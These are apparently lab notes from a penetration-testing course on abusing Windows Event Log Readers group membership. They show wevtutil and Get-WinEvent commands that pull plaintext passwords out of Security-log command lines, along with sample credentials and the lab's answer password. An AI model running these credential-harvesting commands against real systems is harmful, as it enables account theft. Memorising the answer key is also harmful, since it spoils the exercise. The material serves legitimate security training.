# Event Log Readers

In this group we can basically look at command history which may contain credentials and other sensitive information.

**Confirming Group Membership**

```sh
C:\htb> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

**Searching Security Logs Using wevtutil**

```powershell
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

**Passing Credentials to wevtutil**

```sh
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

**Searching Security Logs Using Get-WinEvent**

```powershell-session
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

## Assesment

**Using the methods demonstrated in this section find the password for the user mary.**

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption><p>W1ntergreen_gum_2021!</p></figcaption></figure>
